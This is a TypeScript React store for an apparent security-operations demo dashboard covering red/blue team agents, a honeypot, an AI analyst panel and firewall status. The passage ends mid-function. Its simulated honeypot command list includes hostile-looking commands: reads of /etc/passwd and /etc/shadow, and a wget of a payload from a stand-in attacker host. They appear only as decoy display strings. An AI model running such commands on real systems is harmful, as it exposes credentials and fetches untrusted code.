import { useSyncExternalStore } from "react";
import type {
  AgentConfig,
  AgentConnectionState,
  AgentConnectionStatus,
  AgentTeam,
  AIAction,
  AIAnalystState,
  AiReasoningEvent,
  ApprovalRequest,
  ConnectionState,
  EntityHealth,
  EntityId,
  FirewallCommand,
  FirewallMode,
  FirewallStatus,
  HoneypotStatus,
  OperatingMode,
  OverviewMetrics,
  Severity,
  ShadowEvent,
  SimulationPhase,
  TargetEnvironment,
  TargetAuthorizedConfig,
  TargetConfig,
  TargetStatus,
  TrafficMetric,
} from "./types";
import { createInitialAgentState } from "./types";

// ── Persisted target configuration ──────────────────────────────────────────
// Only the non-secret connection fields (host/port/name/environment) are
// persisted. No passwords, tokens, or API keys ever go into localStorage.
const TARGET_CONFIG_STORAGE_KEY = "shadow-weaver:target-config";

interface PersistedTargetConfig {
  serverHost: string;
  serverPort: number;
  serverName?: string;
  environment?: TargetEnvironment;
}

function loadPersistedTargetConfig(): PersistedTargetConfig | null {
  try {
    const raw = localStorage.getItem(TARGET_CONFIG_STORAGE_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    if (typeof parsed?.serverHost === "string" && typeof parsed?.serverPort === "number") {
      return parsed as PersistedTargetConfig;
    }
    return null;
  } catch {
    // Corrupt or inaccessible storage should never break app startup.
    return null;
  }
}

function savePersistedTargetConfig(config: PersistedTargetConfig) {
  try {
    localStorage.setItem(TARGET_CONFIG_STORAGE_KEY, JSON.stringify(config));
  } catch {
    // Storage can be unavailable (private browsing, quota, etc.) — non-fatal.
  }
}

function clearPersistedTargetConfig() {
  try {
    localStorage.removeItem(TARGET_CONFIG_STORAGE_KEY);
  } catch {
    // Non-fatal.
  }
}

// ── Application state ───────────────────────────────────────────────────────

export interface AppState {
  connection: ConnectionState;
  systemOnline: boolean;
  mode: OperatingMode;
  events: ShadowEvent[];
  traffic: TrafficMetric[];
  health: Record<EntityId, EntityHealth>;
  topology: {
    attackActive: boolean;
    attackTarget: EntityId | null;
  };
  honeypot: {
    status: HoneypotStatus;
    commands: string[];
    fingerprint: {
      sourceIp: string;
      sessionId: string;
      detectionTime: string;
      attackType: string;
      severity: string;
      sessionStatus: string;
      honeypotStatus: string;
    } | null;
  };
  simulation: {
    phase: SimulationPhase;
    running: boolean;
    stopped: boolean;
  };
  approval: {
    pending: ApprovalRequest | null;
  };
  overview: OverviewMetrics;
  lastUpdate: number;
  // Red/Blue Team agent configuration — two fully independent records.
  // Updating `agents.red` must never touch `agents.blue`, and vice versa.
  agents: Record<AgentTeam, AgentConnectionState>;
  settings: {
    open: boolean;
    tab: "general" | "protected_target" | "agents" | "status";
  };
  target: {
    config: TargetConfig;
    status: TargetStatus;
  };
  // AI Security Analyst panel state — updated by the live orchestrator event
  // feed (liveFeed.ts) and by Demo Mode's local fallback lifecycle.
  // Live AI reasoning trail (chronological, provenance-labelled) plus the
  // firewall execution status surface shown by the Live AI Reasoning and
  // Firewall Execution Status panels.
  aiReasoning: AiReasoningEvent[];
  firewall: {
    status: FirewallStatus;
    commands: FirewallCommand[];
  };
  ai: AIAnalystState;
}

// Standby state: subtle, no analysis, no glow. The panel only becomes
// visually prominent once real AI pipeline events arrive.
function createInitialAIState(): AIAnalystState {
  return {
    status: "idle",
    phase: "idle",
    analysis: null,
    action: null,
    verification: null,
    updatedAt: 0,
  };
}

const initialState: AppState = {
  connection: "connecting",
  systemOnline: true,
  mode: "autonomous",
  events: [],
  traffic: [],
  health: {
    red_team: { entity: "red_team", cpu: 12, memory: 34, status: "healthy" },
    blue_team: { entity: "blue_team", cpu: 18, memory: 41, status: "healthy" },
    honeypot: { entity: "honeypot", cpu: 8, memory: 22, status: "healthy" },
  },
  topology: { attackActive: false, attackTarget: null },
  honeypot: {
    status: "waiting",
    commands: [],
    fingerprint: null,
  },
  simulation: { phase: "ready", running: false, stopped: false },
  approval: { pending: null },
  overview: {
    activeThreats: 0,
    threatsDetected: 0,
    threatsContained: 0,
    honeypotCaptures: 0,
    networkTraffic: 0,
    systemHealth: "Healthy",
  },
  lastUpdate: Date.now(),
  agents: {
    red: createInitialAgentState(),
    blue: createInitialAgentState(),
  },
  settings: { open: false, tab: "protected_target" },
  target: buildInitialTargetState(),
  aiReasoning: [],
  firewall: { status: "idle", commands: [] },
  ai: createInitialAIState(),
};

// A saved server (from a previous session) is restored as config only — the
// app never auto-reconnects on load, so there's no network activity or
// loading state tied to startup. The user explicitly reconnects from Settings.
function buildInitialTargetState(): AppState["target"] {
  const saved = loadPersistedTargetConfig();
  if (saved) {
    const authorized: TargetAuthorizedConfig = {
      host: saved.serverHost,
      port: saved.serverPort,
      serverName: saved.serverName,
      environment: saved.environment ?? "private_network",
      authorized: true,
    };
    return {
      config: { mode: "authorized_lab", authorized, demo: null },
      status: { status: "disconnected", mode: "authorized_lab" },
    };
  }
  return {
    config: {
      mode: "demo",
      authorized: null,
      demo: {
        targetName: "DEMO-TARGET",
        targetIP: "192.0.2.10",
        port: 8080,
        environment: "demo",
      },
    },
    status: {
      status: "disconnected",
      mode: "demo",
    },
  };
}

// ── Store implementation ────────────────────────────────────────────────────

type Listener = () => void;

class Store {
  private state: AppState = initialState;
  private listeners = new Set<Listener>();
  // Monotonic run id guards the demo lifecycle: bumping it invalidates any
  // in-flight arming/attack sequence (used by disableDemoMode and re-runs).
  private demoRunId = 0;
  // Short-lived timers for the captured-command stream inside a demo run,
  // cleared together when demo mode is disabled.
  private demoSubTimers: ReturnType<typeof setTimeout>[] = [];
  private eventIdCounter = 0;
  // Optional hook wired by the bootstrap that lets demo start cancel an
  // in-flight Instant Attack without creating an import cycle.
  private abortProviderSimulation: (() => void) | null = null;
  // Sticky flag: becomes true the moment any live ai.*/defense.* event is
  // seen on the orchestrator feed. Demo Mode's local AI fallback only runs
  // while this is false, so the two pipelines never double-draw the panel.
  private aiEventsSeen = false;
  // Bumped when Demo Mode is disabled so an in-flight backend demo pipeline
  // request becomes a no-op when it finally resolves.
  private demoAIRunId = 0;

  // Registers a callback that aborts a running provider simulation. Called
  // from main.tsx so the store never has to import the provider directly.
  registerProviderAbort(hook: () => void) {
    this.abortProviderSimulation = hook;
  }

  getState(): AppState {
    return this.state;
  }

  subscribe(listener: Listener): () => void {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }

  private setState(patch: Partial<AppState>) {
    this.state = { ...this.state, ...patch, lastUpdate: Date.now() };
    this.listeners.forEach((l) => l());
  }

  // ── Actions ───────────────────────────────────────────────────────────────

  setConnection(state: ConnectionState) {
    this.setState({ connection: state });
  }

  setSystemOnline(online: boolean) {
    this.setState({ systemOnline: online });
  }

  setMode(mode: OperatingMode) {
    this.setState({ mode });
  }

  appendEvent(event: ShadowEvent) {
    const stamped = { ...event, id: event.id ?? ++this.eventIdCounter };
    const events = [...this.state.events, stamped].slice(-500);
    this.setState({ events });
  }

  appendTraffic(metric: TrafficMetric) {
    const traffic = [...this.state.traffic, metric].slice(-120);
    this.setState({ traffic });
  }

  setHealth(health: EntityHealth) {
    this.setState({ health: { ...this.state.health, [health.entity]: health } });
  }

  setTopology(patch: Partial<AppState["topology"]>) {
    this.setState({ topology: { ...this.state.topology, ...patch } });
  }

  setHoneypotStatus(status: HoneypotStatus) {
    this.setState({ honeypot: { ...this.state.honeypot, status } });
  }

  appendHoneypotCommand(command: string) {
    const commands = [...this.state.honeypot.commands, command].slice(-50);
    this.setState({ honeypot: { ...this.state.honeypot, commands } });
  }

  setFingerprint(
    fingerprint: AppState["honeypot"]["fingerprint"],
    status: HoneypotStatus = "captured"
  ) {
    this.setState({ honeypot: { ...this.state.honeypot, fingerprint, status } });
  }

  setSimulation(patch: Partial<AppState["simulation"]>) {
    this.setState({ simulation: { ...this.state.simulation, ...patch } });
  }

  setApproval(pending: ApprovalRequest | null) {
    this.setState({ approval: { pending } });
  }

  setOverview(patch: Partial<OverviewMetrics>) {
    this.setState({ overview: { ...this.state.overview, ...patch } });
  }

  // ── AI Security Analyst ────────────────────────────────────────────────────

  // Generic AI state patch (used by the live feed and Demo Mode fallback).
  updateAI(patch: Partial<AIAnalystState>) {
    this.setState({ ai: { ...this.state.ai, ...patch, updatedAt: Date.now() } });
  }

  // Appends one provenance-labelled AI reasoning step to the chronological
  // trail shown by the Live AI Reasoning panel (keep bounded).
  appendAiReasoning(ev: AiReasoningEvent) {
    const trail = [...this.state.aiReasoning, ev].slice(-50);
    this.setState({ aiReasoning: trail });
  }

  // Records one firewall command result. The badge status is derived
  // truthfully: live/simulation from the event mode, error on failure.
  recordFirewallCommand(cmd: {
    action: string;
    target: string;
    command: string;
    success: boolean;
    mode: FirewallMode;
  }) {
    const command: FirewallCommand = {
      id: ++this.eventIdCounter,
      time: new Date().toLocaleTimeString("en-GB", { hour12: false }),
      ...cmd,
    };
    this.setState({
      firewall: {
        status: cmd.success ? cmd.mode : "error",
        commands: [command, ...this.state.firewall.commands].slice(0, 8),
      },
    });
  }

  resetAI() {
    this.demoAIRunId++;
    // A fresh episode starts clean: allow the local demo fallback lifecycle to
    // drive the panel again if the backend is (or becomes) unreachable.
    this.aiEventsSeen = false;
    this.setState({ ai: createInitialAIState() });
  }

  /**
   * Applies one normalized orchestrator frame (from liveFeed.ts) to the AI
   * panel state. Unknown or unrelated event types are ignored so this stays
   * safe to call with the full raw feed.
   */
  applyAIEvent(frame: { type?: string; source?: string; ts?: string; data?: Record<string, unknown> }) {
    const t = String(frame.type ?? "");
    if (!t.startsWith("ai.") && !t.startsWith("defense.") && !t.startsWith("firewall.") && !t.startsWith("verification.") && t !== "threat.contained") return;
    this.aiEventsSeen = true;
    const d = frame.data ?? {};
    const stamp = (frame.ts ?? "").slice(11, 19) || new Date().toLocaleTimeString();

    const toSeverity = (s: unknown): Severity => {
      switch (String(s ?? "").toUpperCase()) {
        case "CRITICAL": return "critical";
        case "HIGH": return "high";
        case "MEDIUM": return "warning";
        default: return "info";
      }
    };

    switch (t) {
      case "ai.analysis.started": {
        this.updateAI({ status: "online", phase: "analyzing", verification: null });
        this.appendEvent({
          type: "ai_analysis_started", severity: "info", source: String(d.source_ip ?? "soc"),
          timestamp: stamp, message: "AI Security Analyst analyzing telemetry…",
        });
        break;
      }
      case "ai.analysis.completed": {
        const a = (d.analysis ?? {}) as Record<string, unknown>;
        if (!a.threat_type) return;
        this.updateAI({
          status: "online",
          phase: "decided",
          // Engine lives at the record's top level, NOT inside the analysis
          // payload (which is the validated 8-field contract). Reading it from
          // the right place keeps the GEMINI label truthful.
          analysis: {
            threatType: String(a.threat_type),
            severity: toSeverity(a.severity),
            confidence: Number(a.confidence ?? 0),
            riskScore: Number(a.risk_score ?? 0),
            indicators: Array.isArray(a.indicators) ? a.indicators.map(String).slice(0, 5) : [],
            reasoning: String(a.reasoning ?? ""),
            recommendedAction: String(a.recommended_action ?? "MONITOR") as AIAction,
            engine: d.engine === "gemini" ? "gemini" : "deterministic",
          },
          responseMs: typeof d.duration_ms === "number" ? d.duration_ms : undefined,
        });
        this.appendEvent({
          type: "ai_analysis_completed",
          severity: toSeverity(a.severity),
          source: String(d.source_ip ?? "soc"),
          timestamp: stamp,
          message: `AI classified ${String(a.threat_type)} — ${String(a.severity)} (confidence ${Math.round(Number(a.confidence ?? 0) * 100)}%)`,
        });
        break;
      }
      case "ai.decision.made": {
        const action = String(d.action ?? "MONITOR") as AIAction;
        const sev = toSeverity(this.state.ai.analysis?.severity);
        this.updateAI({
          status: "online",
          action,
          phase: action === "MONITOR" ? "decided" : "responding",
          verification: action === "MONITOR" ? "MONITORING" : null,
          policyNotes: Array.isArray(d.policy_notes) ? d.policy_notes.map(String) : undefined,
        });
        this.appendEvent({
          type: "ai_decision_made",
          severity: action === "MONITOR" ? "info" : sev,
          source: String(d.source_ip ?? "soc"),
          timestamp: stamp,
          message: `AI decision: ${action}${d.recommended_action && d.recommended_action !== d.action ? ` (policy-adjusted from ${String(d.recommended_action)})` : ""}`,
        });
        break;
      }
      case "defense.action.started": {
        this.updateAI({ status: "online", phase: "responding" });
        this.appendEvent({
          type: "defense_action_started", severity: "warning",
          source: String(d.source_ip ?? "soc"), timestamp: stamp,
          message: `Executing ${String(d.action ?? "defense")} via ${String(d.executor ?? "blue_shield")}…`,
        });
        break;
      }
      case "defense.action.completed": {
        const result = String(d.result ?? "");
        const done = d.verification_required === false || result === "MONITOR_ONLY";
        if (result === "BLOCKED" || result === "CAPTIVE") {
          this.setOverview({ threatsContained: this.state.overview.threatsContained + 1 });
        }
        this.updateAI({
          status: "online",
          phase: done ? "contained" : "verifying",
          verification: done ? "CONTAINED" : null,
        });
        const summary =
          result === "MONITOR_ONLY"
            ? "No active defense required — tracking source under observation"
            : `${String(d.action ?? "Defense")} ${result ? "executed" : "completed"} — ${String(d.action ?? "")} decision applied`;
        this.appendEvent({
          type: "defense_action_completed", severity: "success",
          source: String(d.source_ip ?? "soc"), timestamp: stamp,
          message: summary,
        });
        break;
      }
      case "ai.verification.started": {
        this.updateAI({ status: "online", phase: "verifying" });
        this.appendEvent({
          type: "ai_verification_started", severity: "info",
          source: String(d.source_ip ?? "soc"), timestamp: stamp,
          message: "AI verification started — monitoring the post-action telemetry window",
        });
        break;
      }
      case "ai.verification.completed": {
        const v = (d.verification ?? {}) as Record<string, unknown>;
        const status = String(v.status ?? "UNCERTAIN") as AIAnalystState["verification"];
        this.updateAI({
          status: "online",
          verification: status,
          phase: status === "CONTAINED" ? "contained" : "decided",
        });
        this.appendEvent({
          type: "ai_verification_completed",
          severity: status === "CONTAINED" ? "success" : status === "STILL_ACTIVE" ? "high" : "warning",
          source: String(d.source_ip ?? "soc"), timestamp: stamp,
          message: `AI verification: ${status} — ${String(v.reason ?? "")}`,
        });
        if (status === "CONTAINED") {
          this.appendEvent({
            type: "verification_completed",
            severity: "success",
            source: String(d.source_ip ?? "soc"),
            timestamp: stamp,
            message: `INCIDENT #${String(d.event_id ?? "SW")} — threat contained ✓`,
          });
        }
        break;
      }
      case "ai.reasoning": {
        const risk = String(d.risk ?? "MEDIUM");
        const confidence = Number(d.confidence ?? 0) || 0;
        const stage = String(d.stage ?? "analysis");
        const threatId = String(d.threat_id ?? d.event_id ?? "SW-UNKNOWN");
        const classification = String(d.classification ?? d.threat_type ?? "Unknown");
        this.appendAiReasoning({
          type: "ai_reasoning",
          timestamp: stamp,
          threatId,
          classification,
          confidence,
          risk,
          riskScore: Number(d.risk_score ?? 0) || undefined,
          recommendation: String(d.recommendation ?? "Monitor"),
          target: String(d.target ?? d.ip ?? ""),
          reasoning: String(d.reasoning ?? ""),
          source: d.source === "gemini" ? "gemini" : "simulation",
          mode: d.mode === "live" ? "live" : "demo",
          stage,
          action: d.action ? String(d.action) : undefined,
        });
        // Verification stage closes the lifecycle with the final proof step.
        if (stage === "verification") {
          this.updateAI({
            status: "online",
            phase: "contained",
            verification: "CONTAINED",
          });
          this.appendEvent({
            type: "verification_completed",
            severity: "success",
            source: String(d.ip ?? "soc"),
            target: String(d.target ?? ""),
            timestamp: stamp,
            message: `INCIDENT #${threatId} — verification completed: threat contained ✓`,
          });
        } else if (stage === "decision") {
          const sev = risk === "CRITICAL" || risk === "HIGH" ? "high" : "info";
          this.appendEvent({
            type: "ai_reasoning",
            severity: sev as Severity,
            source: String(d.ip ?? "soc"),
            target: String(d.target ?? ""),
            timestamp: stamp,
            message: `AI ${stage}: ${classification} → ${String(d.action ?? d.recommendation ?? "")}`,
          });
        } else {
          this.appendEvent({
            type: "ai_reasoning",
            severity: risk === "CRITICAL" || risk === "HIGH" ? "high" : "info",
            source: String(d.ip ?? "soc"),
            target: String(d.target ?? ""),
            timestamp: stamp,
            message: `AI ${stage}: ${classification} — ${String(d.recommendation ?? "")}`,
          });
        }
        break;
      }
      case "firewall.executed": {
        const ok = Boolean(d.success);
        const mode = d.mode === "live" ? "live" : "simulation";
        const target = String(d.target ?? d.ip ?? "");
        this.recordFirewallCommand({
          action: String(d.action ?? "block"),
          target,
          command: String(d.command ?? ""),
          success: ok,
          mode,
        });
        this.appendEvent({
          type: "firewall_executed",
          severity: ok ? (mode === "live" ? "success" : "warning") : "critical",
          source: String(d.platform ?? "executor"),
          target,
          timestamp: stamp,
          message: ok
            ? `${mode === "live" ? "LIVE FIREWALL" : "SIMULATION MODE"} — ${String(d.action ?? "block")} of ${target}`
            : `FIREWALL ERROR — ${String(d.command ?? "command")} failed`,
        });
        break;
      }
      case "verification.completed": {
        const vstatus = String(d.status ?? "CONTAINED").toUpperCase();
        const vVerified = vstatus === "CONTAINED";
        this.updateAI({
          status: "online",
          verification: vVerified ? "CONTAINED" : (this.state.ai.verification ?? null),
          phase: vVerified ? "contained" : this.state.ai.phase,
        });
        this.appendEvent({
          type: "verification_completed",
          severity: vVerified ? "success" : "warning",
          source: String(d.ip ?? "soc"),
          timestamp: stamp,
          message: vVerified
            ? `INCIDENT #${String(d.threat_id ?? "SW")} — THREAT CONTAINED ✓`
            : `Verification: ${String(d.status ?? "uncertain")}`,
        });
        break;
      }
      case "threat.contained": {
        this.updateAI({ status: "online", phase: "contained", verification: "CONTAINED" });
        this.appendEvent({
          type: "threat_contained", severity: "success",
          source: String(d.source_ip ?? "soc"), timestamp: stamp,
          message: "Threat contained — AI verified the response was effective",
        });
        break;
      }
    }
  }

  // Demo Mode: fire the REAL backend AI pipeline (Gemini or deterministic
  // engine server-side). Fire-and-forget with a timeout — if the backend is
  // unreachable, Demo Mode continues with its local AI fallback lifecycle.
  private async startDemoAIPipeline(runId: number) {
    try {
      const res = await fetch("http://localhost:8000/api/v1/ai/demo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
        signal: AbortSignal.timeout(15000),
      });
      if (!res.ok) return;
      const data = await res.json().catch(() => null);
      if (!data?.ok || runId !== this.demoAIRunId) return;
      this.appendEvent({
        type: "ai_analysis_started", severity: "info", source: "soc",
        timestamp: new Date().toLocaleTimeString(),
        message: "AI Security Analyst engaged — live backend pipeline driving this demo",
      });
    } catch {
      // Backend unavailable: Demo Mode's local AI fallback (runDemoCycle)
      // drives the AI panel instead. Never crash the demo over this.
    }
  }

  // Empties the captured-session UI (terminal + fingerprint) and puts the
  // honeypot back on standby. Used after a kill switch / reset.
  clearHoneypotSession() {
    this.setState({ honeypot: { status: "waiting", commands: [], fingerprint: null } });
  }

  // ── Target management ──────────────────────────────────────────────────

  setTargetConfig(config: TargetConfig) {
    this.setState({ target: { ...this.state.target, config } });
  }

  connectTarget() {
    const { config, status } = this.state.target;
    // Update status to connecting
    this.setTargetStatus({ ...status, status: "connecting" });

    // Demo mode has no real backend to reach — resolve client-side only.
    // Authorized-lab connections are attempted from TargetConfigForm via
    // targetConnectionService, which then reports the result back through
    // setTargetConnected()/setTargetConnectionFailed() below.
    if (config.mode === "demo") {
      this.enableTargetDemo();
    } else if (!(config.mode === "authorized_lab" && config.authorized)) {
      this.setTargetStatus({
        ...status,
        status: "failed",
        error: "Target not authorized or configuration invalid",
      });
    }
  }

  // Called once targetConnectionService resolves with a successful handshake.
  setTargetConnected(authorized: TargetAuthorizedConfig) {
    this.setTargetConfig({ mode: "authorized_lab", authorized, demo: null });
    this.setTargetStatus({
      status: "connected",
      mode: "authorized_lab",
      target: {
        host: authorized.host,
        port: authorized.port,
        name: authorized.serverName || authorized.host,
        environment: authorized.environment,
      },
      lastChecked: new Date().toISOString(),
      error: undefined,
    });
    savePersistedTargetConfig({
      serverHost: authorized.host,
      serverPort: authorized.port,
      serverName: authorized.serverName,
      environment: authorized.environment,
    });
  }

  // Called once targetConnectionService resolves with a failure, or throws.
  setTargetConnectionFailed(authorized: TargetAuthorizedConfig, error: string) {
    // Keep the entered host/port visible so the user can Retry without
    // re-typing anything; only the status moves to "failed".
    this.setTargetConfig({ mode: "authorized_lab", authorized, demo: null });
    this.setTargetStatus({
      status: "failed",
      mode: "authorized_lab",
      error,
    });
  }

  disconnectTarget() {
    // Reset to demo mode config
    this.setTargetConfig({
      mode: "demo",
      authorized: null,
      demo: {
        targetName: "DEMO-TARGET",
        targetIP: "192.0.2.10",
        port: 8080,
        environment: "demo",
      },
    });
    this.setTargetStatus({
      status: "disconnected",
      mode: "demo",
    });
    // Stop any demo simulation
    this.stopDemoSimulation();
    clearPersistedTargetConfig();
  }

  setTargetStatus(patch: Partial<TargetStatus>) {
    this.setState({ target: { ...this.state.target, status: { ...this.state.target.status, ...patch } } });
  }

  setAgentStatus(team: AgentTeam, status: AgentConnectionStatus, error: string | null = null) {
    const current = this.state.agents[team];
    this.setState({
      agents: {
        ...this.state.agents,
        [team]: {
          ...current,
          status,
          error,
          connectedAt: status === "connected" ? new Date().toISOString() : current.connectedAt,
        },
      },
    });
  }

  setAgentConfig(team: AgentTeam, patch: Partial<AgentConfig>) {
    const current = this.state.agents[team];
    this.setState({
      agents: {
        ...this.state.agents,
        [team]: { ...current, config: { ...current.config, ...patch } },
      },
    });
  }

  // ── Demo Target Mode ──────────────────────────────────────────────────────
  enableTargetDemo() {
    this.abortProviderSimulation?.();
    this.setTargetStatus({ status: "demo_connected", mode: "demo" });
    this.initializeDemoMode();
  }

  authorizeTargetLab() {
    this.setTargetStatus({ status: "connected", mode: "authorized_lab" });
  }

  // ── Demo Mode: instantly mark both agents "connected" client-side,
  // no API keys / network calls needed. Purely for presentations. ──────────
  enableDemoMode() {
    // Cancel any in-flight Instant Attack so the two lifecycles never overlap.
    this.abortProviderSimulation?.();
    (["red", "blue"] as const).forEach((team) => this.setAgentStatus(team, "connected"));
    this.initializeDemoMode();
    // Fire the REAL backend AI pipeline for this demo run (Gemini/deterministic
    // server-side). Falls back silently to the local AI lifecycle below when
    // the backend is unreachable.
    const runId = this.demoAIRunId;
    void this.startDemoAIPipeline(runId);
  }

  // Immediately cancels the demo and returns the dashboard to its calm,
  // neutral starting state — no glow, no attack colors, no animations.
  disableDemoMode() {
    this.cancelDemoLifecycle();
    this.resetAI();
    if (this.state.target.status.status === "demo_connected") {
      this.setTargetStatus({ status: "disconnected", mode: "demo" });
    }
    (["red", "blue"] as const).forEach((team) => this.setAgentStatus(team, "not_connected"));
    this.resetSimulation();
  }

  toggleDemoMode() {
    const isOn = this.state.agents.red.status === "connected" && this.state.agents.blue.status === "connected";
    isOn ? this.disableDemoMode() : this.enableDemoMode();
  }

  // ── Demo lifecycle ────────────────────────────────────────────────────────
  // One deterministic timeline drives the whole demo. Every visual — card
  // colors, glow, honeypot panel, phase stepper — is derived from the state
  // this writes, so the UI always agrees with the actual application state.
  async initializeDemoMode() {
    // Start from a clean slate so a re-run never stacks on old state.
    this.resetSimulation();
    this.resetAI();
    const runId = ++this.demoRunId;
    const wait = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms));
    const cancelled = () => this.demoRunId !== runId;
    const stamp = () => new Date().toLocaleTimeString("en-GB", { hour12: false });

    const capturedCommands = [
      "whoami",
      "id",
      "ls -la",
      "cat /etc/passwd",
      "uname -a",
      "ifconfig",
      "sudo cat /etc/shadow",
      "wget http://evil.example/payload.sh",
    ];

    // Demo Mode is a CONTINUOUS loop: RED → BLUE → HONEYPOT → SAFE → RED → …
    // Every cycle is one complete lifecycle; the next Red attack never starts
    // before the previous Honeypot cycle has fully finished (see runDemoCycle).
    while (!cancelled()) {
      // Fresh cycle: clear the previous cycle's honeypot session + topology so
      // no stale glow/animation leaks across lifecycles. Counters persist —
      // each cycle is one coherent threat lifecycle.
      this.clearHoneypotSession();
      this.setTopology({ attackActive: false, attackTarget: null });
      this.demoSubTimers = []; // every timer from the prior cycle has fired by now

      await this.runDemoCycle({ wait, cancelled, stamp, capturedCommands });
      if (cancelled()) return;

      // Short clean transition in the SAFE state before the next RED.
      await wait(1600);
    }
  }

  // Executes exactly one full demo lifecycle: RED → BLUE → HONEYPOT →
  // CAPTURE → CONTAINMENT → COMPLETED (SAFE). Returns once the cycle is done.
  private async runDemoCycle(ctx: {
    wait: (ms: number) => Promise<void>;
    cancelled: () => boolean;
    stamp: () => string;
    capturedCommands: string[];
  }) {
    const { wait, cancelled, stamp, capturedCommands } = ctx;

    // ONE incident identity per lifecycle: every stage below references the
    // same attacker IP and incident id, so the demo reads as a single
    // continuous attack/defense story (not disconnected animations).
    const incidentId = `SW-${Math.floor(1000 + Math.random() * 9000)}`;
    const attackerIp = "192.168.50.40";
    const blueTarget = "192.168.50.20:8080";

    // Phase 1 — IDLE → ATTACK. Nothing is active before this point: the
    // honeypot stays on standby (no arming glow) so only Red glows now.
    this.setSimulation({ phase: "attack", running: true, stopped: false });
    this.setTopology({ attackActive: true, attackTarget: "blue_team" });
    this.setOverview({ activeThreats: 1 });
    this.appendEvent({
      type: "attack_started",
      severity: "high",
      source: attackerIp,
      target: blueTarget,
      timestamp: stamp(),
      message: `INCIDENT #${incidentId} — Red Team attack started from ${attackerIp}`,
    });
    this.appendEvent({
      type: "service_discovered",
      severity: "warning",
      source: attackerIp,
      target: blueTarget,
      timestamp: stamp(),
      message: "Port scan — open services discovered on protected target (8080 / 22)",
    });

    await wait(1600);
    if (cancelled()) return;

    // ── STEP 2 — Brute Force ─────────────────────────────────────────────
    this.appendEvent({
      type: "suspicious_activity",
      severity: "warning",
      source: attackerIp,
      target: blueTarget,
      timestamp: stamp(),
      message: "Brute force — credential guesses against protected web login",
    });

    await wait(1000);
    if (cancelled()) return;

    // ── STEP 3 — SSH Login Attempt ───────────────────────────────────────
    this.appendEvent({
      type: "suspicious_activity",
      severity: "warning",
      source: attackerIp,
      target: blueTarget,
      timestamp: stamp(),
      message: "SSH login attempt — repeated authentication failures from same source",
    });

    await wait(1000);
    if (cancelled()) return;

    // ── STEP 4 — Threat Detection ────────────────────────────────────────
    this.setSimulation({ phase: "detection" });
    this.setOverview({ threatsDetected: this.state.overview.threatsDetected + 1 });
    this.appendEvent({
      type: "threat_detected",
      severity: "high",
      source: attackerIp,
      target: blueTarget,
      attackType: "SSH brute force",
      timestamp: stamp(),
      message: `Threat detected — brute-force pattern from ${attackerIp} (6 attempts / 10s)`,
    });

    // AI Security Analyst — local fallback lifecycle (only when the live
    // backend pipeline hasn't been seen on the feed; when it has, the real
    // ai.* events drive the panel instead and this block is skipped).
    if (!this.aiEventsSeen) {
      this.updateAI({ phase: "analyzing", status: "offline" });
      this.appendEvent({
        type: "ai_analysis_started", severity: "info", source: attackerIp,
        timestamp: stamp(), message: "AI Security Analyst analyzing telemetry…",
      });
      await wait(1200);
      if (cancelled()) return;
      // ── STEP 5 — AI Analysis (deterministic demo reasoning, explicitly
      // marked source=simulation / mode=demo — never live Gemini) ────────
      this.appendAiReasoning({
        type: "ai_reasoning",
        timestamp: stamp(),
        threatId: incidentId,
        classification: "Brute Force",
        confidence: 0.92,
        risk: "HIGH",
        riskScore: 78,
        recommendation: "Divert to honeypot",
        target: attackerIp,
        reasoning: "Repeated authentication failures from the same source within a short window indicate a likely brute-force attack.",
        source: "simulation",
        mode: "demo",
        stage: "analysis",
      });
      this.updateAI({
        phase: "decided",
        action: "HONEYPOT",
        verification: null,
        analysis: {
          threatType: "SSH_BRUTE_FORCE",
          severity: "critical",
          confidence: 0.94,
          riskScore: 94,
          indicators: [
            "Repeated authentication failures",
            "High request frequency",
          ],
          reasoning:
            "Repeated authentication failures from the same source within a short time window indicate a likely brute-force attack.",
          recommendedAction: "HONEYPOT",
          engine: "deterministic",
        },
      });
      this.appendEvent({
        type: "ai_analysis_completed", severity: "critical", source: attackerIp,
        timestamp: stamp(),
        message: "AI classified SSH_BRUTE_FORCE — HIGH (confidence 92%)",
      });
      this.appendEvent({
        type: "ai_decision_made", severity: "critical", source: attackerIp,
        timestamp: stamp(), message: "AI decision: HONEYPOT — divert attacker into deception environment",
      });
      this.appendAiReasoning({
        type: "ai_reasoning",
        timestamp: stamp(),
        threatId: incidentId,
        classification: "Brute Force",
        confidence: 0.92,
        risk: "HIGH",
        riskScore: 78,
        recommendation: "HONEYPOT",
        target: attackerIp,
        reasoning: "HONEYPOT selected — high-risk brute force is best observed and contained inside the deception environment.",
        source: "simulation",
        mode: "demo",
        stage: "decision",
        action: "HONEYPOT",
      });
      await wait(500);
      if (cancelled()) return;
    }

    await wait(700);
    if (cancelled()) return;

    // Phase 3 — Blue Team has completed its response; the attacker is diverted
    // to the honeypot. Only the honeypot becomes active at this point.
    this.setSimulation({ phase: "honeypot" });
    this.setHoneypotStatus("active");
    this.setTopology({ attackActive: true, attackTarget: "honeypot" });
    this.appendEvent({
      type: "honeypot_active",
      severity: "info",
      source: attackerIp,
      target: "192.168.50.30",
      timestamp: stamp(),
      message: "Honeypot deception environment engaging the attacker",
    });
    if (!this.aiEventsSeen) {
      this.updateAI({ phase: "responding" });
      this.appendEvent({
        type: "defense_action_started", severity: "warning", source: attackerIp,
        timestamp: stamp(), message: "Executing HONEYPOT via blue_shield deception layer…",
      });
    }

    await wait(2200);
    if (cancelled()) return;

    // Phase 4 — Session captured; stream realistic decoy commands.
    this.setSimulation({ phase: "capture" });
    const sessionId = `SES-${Math.floor(1000 + Math.random() * 9000)}`;
    const sourceIp = attackerIp;
    this.setHoneypotStatus("captured");
    this.setFingerprint(
      {
        sourceIp,
        sessionId,
        detectionTime: stamp(),
        attackType: "Credential brute-force",
        severity: "HIGH",
        sessionStatus: "Captured",
        honeypotStatus: "Active",
      },
      "captured"
    );
    this.setOverview({ honeypotCaptures: this.state.overview.honeypotCaptures + 1 });
    this.appendEvent({
      type: "honeypot_session_captured",
      severity: "critical",
      source: sourceIp,
      sessionId,
      attackType: "Credential brute-force",
      timestamp: stamp(),
      message: "Attacker session captured by honeypot — redirecting into deception environment",
    });

    const shuffledCommands = [...capturedCommands].sort(() => Math.random() - 0.5).slice(0, 5);
    shuffledCommands.forEach((cmd, i) => {
      const t = setTimeout(() => {
        if (cancelled()) return;
